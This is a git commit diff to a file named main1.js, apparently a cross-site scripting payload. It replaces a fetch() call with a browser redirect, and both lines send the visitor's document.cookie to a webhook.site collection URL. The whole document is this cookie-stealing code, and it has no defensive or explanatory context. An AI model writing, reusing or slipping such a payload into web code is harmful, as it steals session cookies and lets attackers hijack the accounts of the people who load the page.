14030fdb268c586425a15c6295804c3ccf6be02e
Alvaro Gil <101978161+agm2716@users.noreply.github.com>
2025-11-28 18:39:15 +0100

    Update main1.js

--- main1.js
+++ main1.js
@@ -1,1 +1,1 @@
-fetch("https://webhook.site/d808d3aa-a0c6-4270-8f30-cc07238c8b08?cookie" + document.cookie);
+window.location.href = "https://webhook.site/d808d3aa-a0c6-4270-8f30-cc07238c8b08?cookie" + document.cookie;
